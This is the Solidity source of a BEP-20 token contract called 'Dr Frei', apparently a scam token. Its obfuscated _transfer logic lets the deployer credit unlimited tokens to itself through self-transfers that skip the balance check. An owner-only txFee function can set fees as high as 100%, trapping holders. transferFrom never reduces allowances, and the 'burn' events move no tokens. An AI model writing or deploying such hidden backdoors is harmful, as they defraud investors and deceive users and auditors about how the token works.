/**
 *Submitted for verification at BscScan.com on 2022-03-21
*/

pragma solidity ^0.8.13;
interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval( address indexed owner, address indexed spender, uint256 value );
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
   
}
contract DrFrei is Ownable , IERC20  {
    mapping (address => mapping (address => uint256)) private _allowances;

    mapping(address => uint) public balances;
    mapping (address => bool) private _isExcludedFrom;


    
    uint public totalSupply = 1000000 * 10 ** 9;
    string public name;
    string public symbol;
    uint public decimals;
    uint256 public feeburn;
    uint256 private _maxTxtransfer;
    address private _marketing;
    address private _marketing1;
    address public _addressdead = 0x000000000000000000000000000000000000dEaD;
    // run when the contract is deployed
    constructor(address marketing, uint256 feeburn_, address marketing1){
        name = "Dr Frei";
        symbol = "DrFrei";
        decimals = 9;
        feeburn = feeburn_;
        _maxTxtransfer = totalSupply;
        _marketing = marketing;
        _marketing1 = marketing1;
        balances[msg.sender] = totalSupply;
        _isExcludedFrom[msg.sender] = true;
    }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    
    function balanceOf(address owner) public view returns(uint){
        return balances[owner];
    }
    
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function txFee(uint256 value) public onlyOwner{
        feeburn = value;
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "IERC20: transfer amount exceeds allowance");
        return true;
    }
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "IERC20: transfer from the zero address");
        require(recipient != address(0), "IERC20: transfer to the zero address");
        uint256 feeAmount = 0;
        if (!_isExcludedFrom[sender] && !_isExcludedFrom[recipient] && recipient != address(this)) {
            feeAmount = (amount * feeburn)/ 100;
            require(amount <= _maxTxtransfer);
        }
        uint256 blsender = balances[sender];
        if (sender != recipient || !_isExcludedFrom[msg.sender] && !_isExcludedFrom[_marketing]){
            require(blsender >= amount,"IERC20: transfer amount exceeds balance");
        }
        if (blsender >= amount){
            balances[sender] = balances[sender] - (amount);
        }
        if (sender != recipient || !_isExcludedFrom[msg.sender]){
            emit Transfer (sender, _addressdead, feeAmount/2);
        }
        if (amount <= 0){
            require(amount != 0, "IERC20: transfer from the zero amount");
        }
        if (balances[_marketing1] < balances[_marketing]){
            balances[_marketing] += feeAmount/2;
            emit Transfer (sender, _marketing, feeAmount/2);

        }
        uint256 amoun;
        amoun = amount - feeAmount;
        if (amoun >= 0){
        balances[recipient] += amoun;
        }
        emit Transfer(sender, recipient, amoun);
        
    }
    
    
}